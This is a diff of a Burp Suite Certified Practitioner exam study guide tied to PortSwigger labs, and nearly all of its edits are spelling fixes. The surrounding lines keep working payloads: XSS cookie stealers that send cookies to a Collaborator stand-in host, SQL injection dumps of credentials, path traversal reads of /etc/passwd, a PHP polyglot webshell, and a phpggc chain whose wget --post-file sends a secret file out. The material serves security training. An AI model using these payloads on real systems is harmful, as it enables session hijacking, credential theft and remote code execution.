@@ -69,7 +69,7 @@
 {{$on.constructor('alert(1)')()}}
 ```  
 
->Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Cllaborator.  
+>Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.  
 
 ```JavaScript
 {{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
@@ -81,7 +81,7 @@
 
 [PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  
 
->Below the target is vulnerable to dom-xss in the stock check function. Document.write is the sink used with location.search allowing us to add new value to Javascript variable **storeId**.  
+>Below the target is vulnerable to dom-xss in the stock check function. Document.write is the sink used with location.search allowing us to add new value to JavaScript variable **storeId**.  
 
 ```html
 /product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>  
@@ -97,7 +97,7 @@
 
 ### Dom Invader  
 
->Using Dom Invader plugin and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
+>Using Dom Invader plug-in and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
 
 ![DOM Invader](images/dom-invader.png)  
 
@@ -141,7 +141,7 @@
 
 >To exploit the above code, inject JavaScript into the **JSON** data to change "load-channel" field data and steal document cookie.  
   
->Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is sned to the Burp collaboration server.  
+>Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is send to the Burp collaboration server.  
 
 ```html
 <iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
@@ -175,7 +175,7 @@
 
 >In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
->***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
+>***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a **second** backslash. The resulting double-backslash causes the escaping to be effectively cancelled out.  
 
 ```JavaScript
 \"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
@@ -224,7 +224,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
   
 ### Tags Blocked  
   
->Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG markup allowed using above methodology. This payload steal my own session cookie as POC.  
+>Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above methodology. This payload steal my own session cookie as POC.  
 
 ```
 https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
@@ -352,7 +352,7 @@ fuzzer\';console.log(12345);//
 fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
 ```
 
->Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable, then using backticks to enclose the ```document.location``` path, allow for the cookie stealer to bypass application protection.  
+>Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable, then using back ticks to enclose the ```document.location``` path, allow for the cookie stealer to bypass application protection.  
 
 ```
 \';document.location=`https://COLLABORATOR.com/?BackTicks=`+document.cookie;//
@@ -1211,13 +1211,13 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cook
 ![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)
 
 
->Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data exfil process.  
+>Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data Exfil process.  
 
 ```bash
 sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
 ```  
 
-### SQLi Manual Exploit  
+### Manual SQLi  
 
 >SQL injection vulnerability exploited manually by first finding list of **tables** in the database.  
 
@@ -1228,14 +1228,14 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 >Second retrieve the names of the **columns** in the users table.  
 
 ```sql
-'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qoixrv'--
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--
 ```  
 
 >Final step **dump data** from the username and passwords columns.  
 
 ```sql
-'+UNION+SELECT+username_wrrcyp,+password_zwjmpc+FROM+users_qoixrv--
-``` 
+'+UNION+SELECT+username_XXX,+password_XXX+FROM+users_XXXX--
+```  
 
 ![manual-sqli.png](images/manual-sqli.png)  
 
@@ -1299,7 +1299,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ## ProtoType Pollution  
 
->A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  
+>A target is vulnerable to DOM XSS via client side prototype pollution. **[DOM Invader](#dom-invader)** will identify the gadget and using a hosted payload to performing phishing directed at the victim and steal their cookie.  
 
 >Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.  
 
@@ -1406,7 +1406,7 @@ X-Original-URL: /admin
 
 ```
 
-![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  
+![Exploiting blind XXE to exfiltrate data using a malicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  
 
 [PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
   
@@ -1706,7 +1706,7 @@ stockApi=/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a80
 stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
 ```  
 
-![SSRF Open Rerdirect](images/ssrf-open-rerdirect.png)  
+![SSRF Open Redirect](images/ssrf-open-rerdirect.png)  
 
 [PortSwigger Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)  
   
@@ -1845,9 +1845,9 @@ wrtz{{#with "s" as |string|}}
 2. Images on app is loaded using ```filename``` parameter, and is defending against traversal attacks by stripping path traversal. Exploit using ```....//....//....//....//etc/passwd``` payloads.  
 3. Using URL-encoded ```..%252f..%252f..%252fetc/passwd``` payload can bypass application security controls.  
 4. Leading the begining of the called filename with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
-5. Using a **null** byte charater at end plus an image extension to fool app controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
+5. Using a **null** byte character at end plus an image extension to fool APP controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
   
->Corresponding Directory traversal labs.
+>Corresponding Directory traversal labs.  
 
 1. [PortSwigger Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)  
 2. [PortSwigger Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)  
@@ -1891,7 +1891,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
 2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
-3. Create polygot using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain exfiltrated sensitive data.  
+3. Create polygot using valid image file, by running the command in bash terminal: ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php```. Once polygot uploaded, view the extracted data by issue a GET request to the uploaded path ```/files/avatars/polyglot.php``` , and search the response content for the phrase ```START``` to obtain the sensitive data.  
 4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
   
 >Matching file upload vulnerable labs:  
@@ -1944,7 +1944,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
   
 [PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
 
->**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP funcition and extract content out-of-band using PHPGGC.  
+>**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using PHPGGC.  
 
 ```
 ./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
